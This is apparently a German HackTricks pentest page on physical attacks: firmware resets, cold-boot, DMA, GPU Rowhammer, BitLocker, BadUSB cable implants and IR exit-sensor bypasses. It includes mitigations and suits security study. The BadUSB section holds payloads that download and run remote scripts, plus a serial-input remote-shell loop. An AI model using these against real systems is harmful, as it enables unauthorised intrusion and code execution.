# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

## BIOS-Passwortwiederherstellung und Systemsicherheit

Die Firmware-Einstellungen älterer PCs lassen sich möglicherweise zurücksetzen, indem die CMOS-Batterie entfernt oder ein dokumentierter Clear-CMOS-Jumper verwendet wird. Die erforderliche Zeit ohne Stromversorgung hängt vom Mainboard ab. Moderne UEFI-Passwörter oder -Schlüssel können im nichtflüchtigen Flash-Speicher, in einem Embedded Controller oder in einem Sicherheitsgerät gespeichert sein und daher das Entfernen der Batterie überstehen. Lies im Handbuch des Mainboards oder Servicehandbuch nach, bevor du Pins kurzschließt. Dieses Verfahren kann außerdem TPM-Messungen ungültig machen und die Wiederherstellung der Festplattenverschlüsselung auslösen.

Auf älteren x86-Systemen können Tools wie **killCMOS** und **CmosPwd** CMOS-gestützte Einstellungen in einer bootfähigen Umgebung untersuchen oder ändern. CmosPwd erkennt Passwortformate einer dokumentierten Reihe älterer BIOS-Familien und kann den CMOS-Status sichern, wiederherstellen oder löschen bzw. unbrauchbar machen. Die veröffentlichten Builds sind für ältere DOS-/Windows-, Linux-, FreeBSD- und NetBSD-Umgebungen vorgesehen.<sup>[[18]](#references)</sup> Diese Dienstprogramme entfernen nicht generell UEFI-Passwörter und erfordern ausreichenden Zugriff auf Hardware und Firmware.

Einige Laptop-Firmwares zeigen nach mehreren fehlgeschlagenen Passwortversuchen einen herstellerspezifischen Challenge-Code an. Datenbanken wie [bios-pw.org](https://bios-pw.org) können für einige Modelle Passwörter zur Wiederherstellung älterer Hersteller ableiten. Viele Systeme implementieren jedoch eine Sperre ohne ableitbaren Challenge-Code. Behandle jedes generierte Passwort als modellspezifisch und vermeide es, permanente Versuchs-Zähler aufzubrauchen.

### UEFI-Sicherheit

Für moderne **UEFI**-Systeme kann CHIPSEC die Schutzmaßnahmen für Secure-Boot-Variablen überprüfen. Beginne mit der unten stehenden Prüfung ohne Änderungen. Der optionale Modus `-a modify` versucht absichtlich, Variablen zu beschädigen, und sollte nur auf einem wiederherstellbaren Laborsystem verwendet werden. CHIPSEC warnt selbst davor, dass sein privilegierter Treiber und der hardware-nahe Zugriff für Produktivendpunkte ungeeignet sind.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-Analyse und Cold-Boot-Angriffe

DRAM verliert nicht sofort jedes Bit, wenn der Refresh stoppt. Die Zerfallsrate unterscheidet sich je nach Modultechnologie und Temperatur erheblich; durch Kühlung lassen sich nützliche Daten deutlich länger erhalten als bei einem ungekühlten Aus- und Wiedereinschalten. Bei einem Cold-Boot-Angriff wird schnell in eine kleine Erfassungsumgebung neu gestartet oder ein gekühltes Modul transferiert, um den Rohspeicher auszulesen und trotz Bit-Zerfall kryptografische Schlüssel zu rekonstruieren. Ein Datenträger-Kopierprogramm ist nicht automatisch ein Tool zur Erfassung des physischen Arbeitsspeichers, und Volatility analysiert einen Speicherabzug, statt ihn zu erstellen. Verwende ein für die Plattform geeignetes, validiertes Erfassungstool.<sup>[[12]](#references)</sup>

---

## GPU-Rowhammer gegen Seitentabellen

Moderne GPU-Rowhammer-Angriffe werden deutlich wirksamer, wenn sie **GPU-Metadaten des virtuellen Speichers** statt gewöhnlicher Puffer ins Visier nehmen. Neuere Arbeiten zu **GDDR6-NVIDIA-Ampere-GPUs** zeigen, dass ein Angreifer mit nicht privilegiertem CUDA-Code GPU-spezifische Hammering-Muster erstellen, mithilfe von **Memory Massaging** Paging-Strukturen in anfälligen Zeilen platzieren und dann Bits in der **Seitentabelle der letzten Ebene** oder einem übergeordneten **Seitenverzeichnis** kippen kann. Wird ein einzelner Übersetzungseintrag beschädigt, kann der Angreifer darüber **beliebige GPU-Speicher-Lese-/Schreibzugriffe** einrichten und anschließend zur Kompromittierung des Hosts übergehen.<sup>[[1]](#references)[[2]](#references)</sup>

### Ausnutzungsmuster

1. **Hammering-anfällige Zeilen** in GDDR6 ermitteln und refresh-bewusste / nicht einheitliche Hammering-Muster erstellen, die In-DRAM-Mitigations umgehen.
2. **GPU-Allokationen manipulieren**, sodass der Treiber Übersetzungsstrukturen für Seiten an hammering-anfälligen physischen Speicherorten platziert, statt sie im standardmäßigen geschützten Pool zu belassen. Praktisch kann das bedeuten, den Speicherbereich für Seitentabellen im niedrigen Speicherbereich zu erschöpfen und große, dünn besetzte UVM-Zuordnungen mit kontrollierten Schrittweiten zu verteilen.
3. **Übersetzungsmetadaten** wie **PFN**- oder aperture-bezogene Bits in einem Eintrag einer Seiten- oder Verzeichnistabelle kippen, sodass die vom Angreifer kontrollierte virtuelle Seite auf Seiten für Seitentabellen, beliebigen GPU-Speicher oder für den Host sichtbare Systemzuordnungen verweist.
4. Die gefälschte Zuordnung wiederverwenden, um weitere Übersetzungseinträge zu überschreiben und **beliebige GPU-Speicher-Lese-/Schreibzugriffe** über GPU-Kontexte hinweg zu erlangen.

### Host-Pivot und Mitigations

- Ist die **IOMMU deaktiviert**, können gefälschte System-Aperture-Zuordnungen beliebigen **physischen Host-Speicher** für die GPU zugänglich machen und so aus dem GPU-Primitiv eine vollständige Kompromittierung des Hosts machen.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** zielt auf Einträge der Seitentabelle der letzten Ebene ab, während **GeForge** zeigt, dass die Beschädigung einer Ebene des Seitenverzeichnisses einfacher sein kann, da ein einzelner Bit-Flip einen größeren Übersetzungs-Teilbaum umlenken kann. Betrachte nicht nur eine Paging-Ebene als sicherheitskritisch.<sup>[[1]](#references)[[2]](#references)</sup>
- Die **IOMMU** ist weiterhin wichtig, da sie den direkten Zugriff auf beliebigen Host-Speicher verhindert, den GDDRHammer/GeForge nutzen. Sie ist jedoch **keine vollständige Mitigation**. **GPUBreach** zeigt einen Pivot in einer zweiten Stufe: Der Angreifer beschädigt von der GPU beschreibbare, vom Treiber verwaltete CPU-Puffer und löst anschließend NVIDIA-Treiberfehler zur Speichersicherheit aus, um eine Kernel-Schreibprimitive und selbst bei aktivierter IOMMU eine **Root-Shell** zu erlangen.<sup>[[3]](#references)</sup>
- **System-ECC** ist eine praktische Härtungsmaßnahme für unterstützte Workstation-/Server-GPUs. Consumer-GPUs ohne ECC bieten eine schwächere Abwehrfläche.<sup>[[4]](#references)</sup>
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1.171** Bit-Flips auf einer RTX 3060 und **202** auf einer RTX A6000. Das reichte aus, um eine funktionierende Kette zur Erhöhung der Host-Privilegien aufzubauen.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct-Memory-Access-(DMA-)Angriffe

Informationen zum Offline-Patching von UEFI IFR/NVRAM, mit dem sich die IOMMU-Durchsetzung vor dem Booten herabstufen und eine Windows-DMA-Angriffskette ermöglichen lässt, findest du hier:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstriert die **DMA-basierte Speichererfassung und -manipulation** über Schnittstellen wie FireWire und frühe Thunderbolt-Konfigurationen, einschließlich historischer Signaturen zur Umgehung der Anmeldung. Es ist nicht einfach „gegen Windows 10 wirkungslos“: Die Ausnutzbarkeit hängt von der Schnittstelle, dem Ziel-Build, der IOMMU-Richtlinie, dem Sperrzustand und davon ab, ob Windows Kernel DMA Protection unterstützt und aktiviert ist. Windows 10, Version 1803 und höher, führte Kernel DMA Protection auf kompatiblen Plattformen ein und veränderte damit die Angriffsfläche erheblich.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live-CD/USB für Systemzugriff

Auf einem unverschlüsselten oder bereits entsperrten Windows-Volume kann eine Offline-Umgebung Eingabehilfen-Binärdateien wie **sethc.exe** oder **Utilman.exe** durch **cmd.exe** ersetzen. Dadurch wird eine SYSTEM-Eingabeaufforderung geöffnet, wenn die entsprechende Tastenkombination auf dem Anmeldebildschirm ausgeführt wird. Tools wie **chntpw** können lokale SAM-Kontodaten bearbeiten. Diese Methoden umgehen kein gesperrtes BitLocker-Volume und können mit DPAPI/EFS geschützte Anmeldedaten beschädigen. Bewahre forensische Kopien und Backups auf.

**Kon-Boot** ist ein kommerzielles Tool zur Umgehung der Authentifizierung beim Booten für unterstützte Windows-/macOS-Konfigurationen. Die Kompatibilität hängt vom Betriebssystem, Firmware-Modus, Secure Boot und der Datenträgerverschlüsselung ab. Es entschlüsselt kein gesperrtes BitLocker-Volume.<sup>[[10]](#references)</sup>

---

## Umgang mit Windows-Sicherheitsfunktionen

### Start- und Wiederherstellungs-Tastenkombinationen

- **Entf/Supr**, F2, F10 oder eine andere herstellerspezifische Taste kann das Firmware-Setup öffnen.
- **F8** öffnet die erweiterten Startoptionen älterer Windows-Versionen nur bei Konfigurationen, in denen dieser Weg noch aktiviert ist. Der Zugriff auf die aktuelle Wiederherstellungsumgebung variiert.
- Das Gedrückthalten von **Shift** kann die automatische Windows-Anmeldung in manchen Konfigurationen unterdrücken. Richtlinien-/Registrierungseinstellungen können dieses Verhalten jedoch deaktivieren.<sup>[[17]](#references)</sup>

### BAD-USB-Geräte

Geräte wie **USB Rubber Ducky** und Teensy-Boards können sich als vertrauenswürdige HID-Tastaturen anmelden und vorgegebene Tastenanschläge einspeisen. Die Payload verfügt zunächst über die Berechtigungen und den Desktopzugriff der angemeldeten Sitzung. UAC-Eingabeaufforderungen, Bildschirmsperren, Tastaturlayout, Timing und USB-Richtlinien für Endgeräte schränken sie weiterhin ein.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator- oder Backup-Berechtigungen können zum Erstellen einer Schattenkopie oder zum Speichern von Registrierungs-Hives verwendet werden, sodass gesperrte Dateien wie **SAM** und **SYSTEM** erfasst werden können. Dies ist eine Technik zur Sammlung von Daten nach einer Kompromittierung, keine Umgehung von Berechtigungen. Die Aktivität sollte mit Ereignissen zu `diskshadow`/VSS und zum Export von Registrierungs-Hives abgeglichen werden.

## BadUSB- / HID-Implantat-Techniken

### Wi-Fi-Implantate in Kabeln

- ESP32-S3-basierte Implantate wie **Evil Crow Cable Wind** verbergen sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, melden sich ausschließlich als USB-Tastatur an und stellen ihren C2-Stack über Wi-Fi bereit. Der Operator muss das Kabel lediglich über den Host des Opfers mit Strom versorgen, einen Hotspot namens `Evil Crow Cable Wind` mit dem Passwort `123456789` einrichten und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) aufrufen, um auf die integrierte HTTP-Oberfläche zuzugreifen.<sup>[[8]](#references)</sup>
- Die Browseroberfläche bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads sind nach Betriebssystem gekennzeichnet, Tastaturlayouts werden spontan umgeschaltet und VID/PID-Zeichenfolgen können angepasst werden, um bekannte Peripheriegeräte nachzuahmen.
- Da der C2 im Kabel untergebracht ist, kann ein Smartphone Payloads bereitstellen, deren Ausführung auslösen und Wi-Fi-Zugangsdaten verwalten, ohne das Netzwerk der Organisation zu verwenden – nützlich bei physischen Eindringversuchen mit kurzer Verweildauer.

### Betriebssystemabhängige AutoExec-Payloads

- AutoExec-Regeln verknüpfen eine oder mehrere Payloads, die direkt nach der USB-Anmeldung ausgeführt werden. Das Implantat ermittelt das Betriebssystem mit einem einfachen Fingerprinting und wählt das passende Skript aus.
- Beispiel-Workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (Terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann bereits der Austausch eines Ladekabels einen „Plug-and-Pwn“-Erstzugriff im Kontext des angemeldeten Benutzers ermöglichen.

### HID-gestützte Remote-Shell über Wi-Fi-TCP

1. **Tastatureingabe zum Bootstrap:** Eine gespeicherte Payload öffnet eine Konsole und fügt eine Schleife ein, die alles ausführt, was über das neue USB-Seriellgerät eingeht. Eine minimale Windows-Variante sieht so aus:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kabel-Bridge:** Das Implant hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktop-Executable) zum Operator startet. Alle in die TCP-Sitzung eingegebenen Bytes werden in die obige serielle Schleife weitergeleitet, wodurch auch auf air-gapped Hosts Remote Command Execution möglich ist. Die Ausgabe ist begrenzt, daher führen Operatoren üblicherweise blinde Befehle aus (Erstellen von Konten, Bereitstellen zusätzlicher Tools usw.).

### HTTP-OTA-Update-Oberfläche

- Die dokumentierte Evil Crow Cable Wind-Oberfläche stellt unter `/update` einen nicht authentifizierten Firmware-Update-Endpunkt bereit:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Einsatzkräfte können Funktionen während eines Einsatzes hot-swappen (z. B. USB Army Knife-Firmware flashen), ohne das Kabel zu öffnen. So kann das Implantat neue Fähigkeiten nutzen und bleibt dabei mit dem Zielhost verbunden.

## BitLocker-Verschlüsselung umgehen

Eine autorisierte forensische Erfassung eines laufenden oder kürzlich verwendeten Systems kann einen BitLocker-Volume-Master-Key oder verwandtes Schlüsselmaterial enthalten, solange das Volume entsperrt ist. Kommerzielle Tools wie Elcomsoft Forensic Disk Decryptor und Passware Kit Forensic können unterstützte Speicherabbilder, Ruhezustandsdateien oder Crash-Dumps durchsuchen, doch ein Erfolg ist nicht garantiert. Moderne Windows-Versionen verschlüsseln Crash-Dumps außerdem, wenn BitLocker aktiviert ist. Ein gespeichertes 48-stelliges Wiederherstellungspasswort ist ein anderes Artefakt als ein In-Memory-Volume-Key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering zum Hinzufügen eines Wiederherstellungsschlüssels

Ein Angreifer, der einen Administrator dazu überredet, BitLocker-Verwaltungsbefehle auszuführen, kann einen Wiederherstellungspasswort-, externen Schlüssel- oder anderen Protector hinzufügen und ihn anschließend abfangen. Ein Wiederherstellungspasswort kann keine beliebige Folge von Nullen sein: Für numerische BitLocker-Wiederherstellungspasswörter gilt ein validiertes 48-stelliges Format. Die entsprechende Syntax für die autorisierte Verwaltung lautet `manage-bde -protectors -add C: -recoverypassword`; die hinzugefügten Protectors lassen sich mit `manage-bde -protectors -get C:` auflisten. Überwachen Sie das Hinzufügen von Protectors und stellen Sie sicher, dass neues Wiederherstellungsmaterial nur an genehmigten Speicherorten hinterlegt wird.<sup>[[16]](#references)</sup>

---

## BIOS auf Werkseinstellungen zurücksetzen durch Ausnutzen von Gehäuse- / Wartungsschaltern

Viele moderne Laptops und Small-Form-Factor-Desktops besitzen einen **Gehäuse-Öffnungsschalter**, der vom Embedded Controller (EC) und der BIOS-/UEFI-Firmware überwacht wird. Der Hauptzweck des Schalters besteht zwar darin, beim Öffnen eines Geräts einen Alarm auszulösen, doch einige Hersteller implementieren eine **undokumentierte Wiederherstellungsfunktion**, die bei einem bestimmten Schaltmuster ausgelöst wird.<sup>[[5]](#references)[[6]](#references)</sup>

### Funktionsweise des Angriffs

1. Der Schalter ist mit einem **GPIO-Interrupt** am EC verbunden.
2. Die auf dem EC laufende Firmware erfasst **Zeitabstände und Anzahl der Betätigungen**.
3. Wird ein fest codiertes Muster erkannt, ruft der EC eine *Mainboard-Reset-Routine* auf, die **den Inhalt des System-NVRAM/CMOS löscht**.
4. Beim nächsten Start laden betroffene Modelle einen zurückgesetzten Firmware-Zustand. Je nach Hersteller und Revision können dazu ein Supervisor-Passwort, benutzerdefinierte Starteinstellungen oder eingeschriebene Secure-Boot-Schlüssel gehören. Auswirkungen auf den TPM-Zustand und die Laufwerksverschlüsselung müssen gesondert bewertet werden.

> Ein Firmware-Reset kann Optionen für den Start von externen Medien wiederherstellen, entschlüsselt jedoch **keine** Datenträger. BitLocker oder ein anderes System zur vollständigen Laufwerksverschlüsselung kann nach Änderungen am TPM oder an der Firmware in den Wiederherstellungsmodus wechseln und das interne Laufwerk weiterhin ohne Wiederherstellungsschlüssel schützen.<sup>[[16]](#references)</sup>

### Praxisbeispiel – Framework-13-Laptop

Die Wiederherstellungsfunktion für das Framework 13 (11./12./13. Generation) lautet:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Nach dem zehnten Zyklus setzt die EC ein Flag, das das BIOS anweist, beim nächsten Neustart den NVRAM zu löschen. Der gesamte Vorgang dauert etwa 40 Sekunden und erfordert **nichts außer einem Schraubendreher**.<sup>[[5]](#references)</sup>

### Allgemeiner Exploit-Ablauf

1. Schalte das Zielgerät ein oder versetze es in den Energiesparmodus und wecke es wieder auf, damit die EC läuft.
2. Entferne die Bodenabdeckung, um den Einbruch-/Wartungsschalter freizulegen.
3. Wiederhole das herstellerspezifische Umschaltmuster (sieh in der Dokumentation oder in Foren nach oder analysiere die EC-Firmware zurück).
4. Setze das Gerät wieder zusammen und starte es neu. Prüfe anschließend, welche Firmware-Einstellungen und Zugangsdaten sich tatsächlich geändert haben.
5. Wenn du dazu berechtigt bist und externes Booten möglich ist, boote ein kontrolliertes Live-Image. Sobald ein internes Volume ordnungsgemäß entsperrt wurde (oder nie verschlüsselt war), kann die Live-Umgebung Zugangsdaten und Daten erfassen oder die EFI System Partition untersuchen. Änderungen an dieser Partition zur Installation eines EFI-Implants sind dauerhaft und äußerst invasiv und unterliegen weiterhin den Einschränkungen durch Secure Boot, measured boot, Firmware-Schreibschutz und Endgeräteüberwachung. Auf verschlüsselten Speicher kann ohne Schlüssel oder Wiederherstellungsmaterial nicht zugegriffen werden.

### Erkennung & Abwehr

* Protokolliere Gehäuseöffnungsereignisse in der OS-Verwaltungskonsole und gleiche sie mit unerwarteten BIOS-Resets ab.
* Verwende **manipulationssichere Siegel** an Schrauben und Abdeckungen, um ein Öffnen zu erkennen.
* Bewahre Geräte in **physisch gesicherten Bereichen** auf; gehe davon aus, dass physischer Zugriff einer vollständigen Kompromittierung gleichkommt.
* Deaktiviere, sofern verfügbar, die Funktion „maintenance switch reset“ des Herstellers oder verlange eine zusätzliche kryptografische Autorisierung für NVRAM-Resets.

---

## Verdeckte IR-Injektion gegen berührungslose Exit-Sensoren

### Sensoreigenschaften
- Handelsübliche „wave-to-exit“-Sensoren kombinieren einen Nahinfrarot-LED-Sender mit einem Empfängermodul ähnlich dem einer TV-Fernbedienung, das erst dann ein High-Signal ausgibt, wenn es mehrere Impulse (~4–10) mit der richtigen Trägerfrequenz (≈30 kHz) erkannt hat.<sup>[[7]](#references)</sup>
- Eine Kunststoffabdeckung verhindert, dass Sender und Empfänger direkt aufeinander gerichtet sind. Daher geht die Steuerung davon aus, dass ein erkanntes Trägersignal von einer nahegelegenen Reflexion stammt, und schaltet ein Relais, das den Türöffner betätigt.
- Sobald die Steuerung glaubt, dass sich ein Ziel in der Nähe befindet, ändert sie oft die Modulationshüllkurve des Sendesignals. Der Empfänger akzeptiert jedoch weiterhin alle Impulsfolgen, die zur gefilterten Trägerfrequenz passen.

### Angriffsablauf
1. **Zeichne das Abstrahlprofil auf** – klemme einen Logikanalysator an die Pins der Steuerung, um sowohl die Wellenformen vor als auch nach der Erkennung aufzuzeichnen, mit denen die interne IR-LED angesteuert wird.
2. **Spiele nur die Wellenform „nach der Erkennung“ ab** – entferne oder ignoriere den werkseitigen Sender und steuere von Anfang an eine externe IR-LED mit dem bereits ausgelösten Muster an. Da der Empfänger nur Impulszahl und Frequenz berücksichtigt, behandelt er den gefälschten Träger wie eine echte Reflexion und aktiviert die Relaisleitung.
3. **Steuere die Übertragung** – sende den Träger in abgestimmten Impulsfolgen (z. B. einige zehn Millisekunden ein, ähnlich lange aus), um die erforderliche Mindestimpulszahl zu erreichen, ohne die AGC des Empfängers oder dessen Störungslogik zu überlasten. Eine dauerhafte Abstrahlung desensibilisiert den Sensor schnell und verhindert, dass das Relais auslöst.

### Reflektierende Injektion aus großer Entfernung
- Der Austausch der LED am Prüfstand gegen eine leistungsstarke IR-Diode, einen MOSFET-Treiber und Fokussieroptik ermöglicht ein zuverlässiges Auslösen aus etwa 6 m Entfernung.
- Der Angreifer benötigt keine direkte Sichtverbindung zur Empfängeröffnung. Wird der Strahl auf Innenwände, Regale oder Türrahmen gerichtet, die durch Glas sichtbar sind, kann reflektierte Energie in den Erfassungswinkel von etwa 30° gelangen und eine Handbewegung aus kurzer Entfernung nachahmen.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein deutlich stärkerer externer Strahl von mehreren Oberflächen reflektiert werden und dennoch über der Erkennungsschwelle bleiben.

### Für Angriffe präparierte Taschenlampe
- Wird der Treiber in einer handelsüblichen Taschenlampe untergebracht, fällt das Werkzeug kaum auf. Ersetze die sichtbare LED durch eine leistungsstarke IR-LED, die auf das Frequenzband des Empfängers abgestimmt ist, ergänze einen ATtiny412 (oder Ähnliches) zur Erzeugung der Impulsfolgen mit ≈30 kHz und verwende einen MOSFET, um den LED-Strom zu schalten.
- Eine ausziehbare Zoomlinse bündelt den Strahl für größere Reichweite und präziseres Zielen. Ein Vibrationsmotor, der vom MCU gesteuert wird, bestätigt haptisch, dass die Modulation aktiv ist, ohne sichtbares Licht abzugeben.
- Das Durchschalten mehrerer gespeicherter Modulationsmuster (mit leicht unterschiedlichen Trägerfrequenzen und Hüllkurven) erhöht die Kompatibilität mit umgelabelten Sensorfamilien. So kann der Bediener reflektierende Oberflächen absuchen, bis das Relais hörbar klickt und die Tür entriegelt wird.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)

{{#include ../banners/hacktricks-training.md}}
